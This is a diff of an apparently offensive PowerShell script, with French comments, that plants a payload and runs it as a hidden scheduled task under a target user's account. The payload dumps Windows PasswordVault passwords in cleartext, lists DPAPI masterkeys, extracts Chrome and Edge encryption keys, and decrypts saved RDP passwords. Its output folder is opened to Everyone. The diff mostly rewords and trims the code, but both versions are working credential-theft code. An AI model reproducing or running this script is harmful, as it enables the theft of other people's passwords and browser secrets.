@@ -9,7 +9,7 @@ param(
 )
 
 New-Item -ItemType Directory -Path $OutputDir -Force | Out-Null
-icacls $OutputDir /grant "Everyone:(OI)(CI)F" | Out-Null
+icacls $OutputDir /grant "*S-1-1-0:(OI)(CI)F" | Out-Null
 
 foreach ($f in @(
     "dpapi.ps1",
@@ -24,7 +24,7 @@ foreach ($f in @(
 )) {
     Remove-Item -Path "$OutputDir\$f" -Force -ErrorAction SilentlyContinue
     New-Item -Path "$OutputDir\$f" -ItemType File -Force | Out-Null
-    icacls "$OutputDir\$f" /grant "Everyone:(F)" | Out-Null
+    icacls "$OutputDir\$f" /grant "*S-1-1-0:(F)" | Out-Null
 }
 
 Write-Host "[*] Creating DPAPI harvest script..." -ForegroundColor Cyan
@@ -164,46 +164,36 @@ try {
 # ============================================================
 "[*] Windows PasswordVault - `$(Get-Date)" | Out-File "`$outputDir\dpapi-vault.log"
 try {
-    [void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
     `$vault = New-Object Windows.Security.Credentials.PasswordVault
-    `$creds = `$vault.RetrieveAll()
-    if (`$creds.Count -eq 0) {
-        "No entries found." | Out-File "`$outputDir\dpapi-vault.log" -Append
-    } else {
-        foreach (`$c in `$creds) {
-            try {
-                `$c.RetrievePassword()
-                "--- Entry ---`nResource : `$(`$c.Resource)`nUsername : `$(`$c.UserName)`nPassword : `$(`$c.Password)" | Out-File "`$outputDir\dpapi-vault.log" -Append
-            } catch {
-                "[ERROR] `$(`$c.Resource) : `$_" | Out-File "`$outputDir\dpapi-vault.log" -Append
-            }
-        }
+    `$vault.RetrieveAll() | ForEach-Object {
+        `$_.RetrievePassword()
+        "Resource : `$(`$_.Resource)" | Out-File "`$outputDir\dpapi-vault.log" -Append
+        "UserName : `$(`$_.UserName)" | Out-File "`$outputDir\dpapi-vault.log" -Append
+        "Password : `$(`$_.Password)" | Out-File "`$outputDir\dpapi-vault.log" -Append
+        "---" | Out-File "`$outputDir\dpapi-vault.log" -Append
     }
 } catch {
     "[ERROR] PasswordVault failed : `$_" | Out-File "`$outputDir\dpapi-vault.log" -Append
 }
 
 # ============================================================
-# 3. MASTERKEYS - listing et copie
+# 3. MASTERKEYS - liste des fichiers de cles maitresses
 # ============================================================
-"[*] DPAPI Masterkeys - `$(Get-Date)" | Out-File "`$outputDir\dpapi-masterkeys.log"
+"[*] DPAPI MasterKeys - `$(Get-Date)" | Out-File "`$outputDir\dpapi-masterkeys.log"
 `$mkPath = "`$env:APPDATA\Microsoft\Protect"
 if (Test-Path `$mkPath) {
     Get-ChildItem `$mkPath -Recurse -Force -ErrorAction SilentlyContinue |
-        Select-Object FullName, LastWriteTime, Length |
+        Select-Object FullName, Length, LastWriteTime |
         Format-List |
         Out-File "`$outputDir\dpapi-masterkeys.log" -Append
-    New-Item -ItemType Directory -Path "`$outputDir\masterkeys" -Force | Out-Null
-    Copy-Item `$mkPath "`$outputDir\masterkeys\" -Recurse -Force -ErrorAction SilentlyContinue
-    "[*] Masterkeys copied to `$outputDir\masterkeys\" | Out-File "`$outputDir\dpapi-masterkeys.log" -Append
 } else {
-    "[WARN] Masterkeys path not found" | Out-File "`$outputDir\dpapi-masterkeys.log" -Append
+    "[WARN] MasterKeys path not found" | Out-File "`$outputDir\dpapi-masterkeys.log" -Append
 }
 
 # ============================================================
-# 4. CHROME - cle AES + databases
+# 4. CHROME - cle AES + bases de donnees
 # ============================================================
-"[*] Chrome DPAPI key - `$(Get-Date)" | Out-File "`$outputDir\dpapi-browser-chrome.log"
+"[*] Chrome key files - `$(Get-Date)" | Out-File "`$outputDir\dpapi-browser-chrome.log"
 `$chromeLS = "`$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
 if (Test-Path `$chromeLS) {
     try {
@@ -217,7 +207,7 @@ if (Test-Path `$chromeLS) {
             "Chrome AES key (hex) : `$hexKey" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append
         }
         if (`$ls.os_crypt.app_bound_encrypted_key) {
-            "[WARN] app_bound_encrypted_key found - Chrome >= 127 - this key won't decrypt newer cookies/passwords" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append
+            "[WARN] app_bound_encrypted_key found - this key won't decrypt newer cookies/passwords" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append
         }
     } catch {
         "[ERROR] Chrome key failed : `$_" | Out-File "`$outputDir\dpapi-browser-chrome.log" -Append
@@ -242,9 +232,9 @@ if (Test-Path `$chromeDefault) {
 }
 
 # ============================================================
-# 5. EDGE - cle AES + databases
+# 5. EDGE - cle AES + bases de donnees
 # ============================================================
-"[*] Edge DPAPI key - `$(Get-Date)" | Out-File "`$outputDir\dpapi-browser-edge.log"
+"[*] Edge key files - `$(Get-Date)" | Out-File "`$outputDir\dpapi-browser-edge.log"
 `$edgeLS = "`$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
 if (Test-Path `$edgeLS) {
     try {
@@ -316,7 +306,6 @@ Get-ChildItem "`$env:USERPROFILE" -Filter "*.rdp" -Recurse -ErrorAction Silently
         `$blob = `$Matches[1].Trim()
         `$decrypted = `$null
 
-        # Tentative 1 : hex-encoded (format standard mstsc)
         if (-not `$decrypted -and `$blob -match '^[0-9A-Fa-f]+$' -and `$blob.Length % 2 -eq 0) {
             try {
                 `$bytes = New-Object byte[] (`$blob.Length / 2)
@@ -328,7 +317,6 @@ Get-ChildItem "`$env:USERPROFILE" -Filter "*.rdp" -Recurse -ErrorAction Silently
             } catch {}
         }
 
-        # Tentative 2 : base64-encoded
         if (-not `$decrypted) {
             try {
                 `$bytes = [System.Convert]::FromBase64String(`$blob)
@@ -337,7 +325,6 @@ Get-ChildItem "`$env:USERPROFILE" -Filter "*.rdp" -Recurse -ErrorAction Silently
             } catch {}
         }
 
-        # Tentative 3 : raw bytes
         if (-not `$decrypted) {
             try {
                 `$bytes = [System.Text.Encoding]::Default.GetBytes(`$blob)
@@ -346,7 +333,6 @@ Get-ChildItem "`$env:USERPROFILE" -Filter "*.rdp" -Recurse -ErrorAction Silently
             } catch {}
         }
 
-        # Tentative 4 : ProtectedData .NET
         if (-not `$decrypted) {
             try {
                 `$decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect([System.Convert]::FromBase64String(`$blob), `$null, 'CurrentUser')
@@ -377,12 +363,12 @@ foreach (`$p in @("`$env:LOCALAPPDATA\Microsoft\Vault", "`$env:APPDATA\Microsoft
     }
 }
 "@ | Set-Content -Path "$OutputDir\dpapi.ps1" -Encoding ASCII
-icacls "$OutputDir\dpapi.ps1" /grant "Everyone:(F)" | Out-Null
+icacls "$OutputDir\dpapi.ps1" /grant "*S-1-1-0:(F)" | Out-Null
 
 Write-Host "[*] Creating and starting scheduled task as $TargetUser..." -ForegroundColor Cyan
 Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue
-$settings = New-ScheduledTaskSettingsSet -Hidden
-$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $OutputDir\dpapi.ps1" -WorkingDirectory $OutputDir
+$settings  = New-ScheduledTaskSettingsSet -Hidden
+$action    = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File $OutputDir\dpapi.ps1" -WorkingDirectory $OutputDir
 $principal = New-ScheduledTaskPrincipal -UserId $TargetUser -LogonType Interactive -RunLevel Limited
 Register-ScheduledTask -TaskName $TaskName -Action $action -Principal $principal -Settings $settings -Force | Out-Null
 Start-ScheduledTask -TaskName $TaskName
